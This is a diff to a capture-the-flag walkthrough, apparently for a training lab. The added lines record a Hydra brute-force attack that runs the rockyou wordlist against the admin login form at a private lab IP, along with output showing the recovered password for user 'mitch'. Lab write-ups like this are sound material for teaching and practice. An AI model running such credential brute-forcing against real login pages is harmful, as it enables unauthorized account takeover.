@@ -135,6 +135,20 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-27 04:54:
 [STATUS] 132.14 tries/min, 925 tries in 00:07h, 8294530 to do in 1046:10h, 4 active
 [80][http-post-form] host: 10.10.83.63   login: mitch   password: test
 ```
+we found the username, now brute force the password
+
+```
+kali@kali:~/Downloads$ hydra -l mitch -P /usr/share/wordlists/rockyou.txt 10.10.83.63 -t 4 http-form-post "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:F=incorrect" 
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-27 05:13:01
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking http-post-form://10.10.83.63:80/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:F=incorrect
+[80][http-post-form] host: 10.10.83.63   login: mitch   password: secret
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-27 05:13:38
+```
 
 ### Where can you login with the details obtained?
 
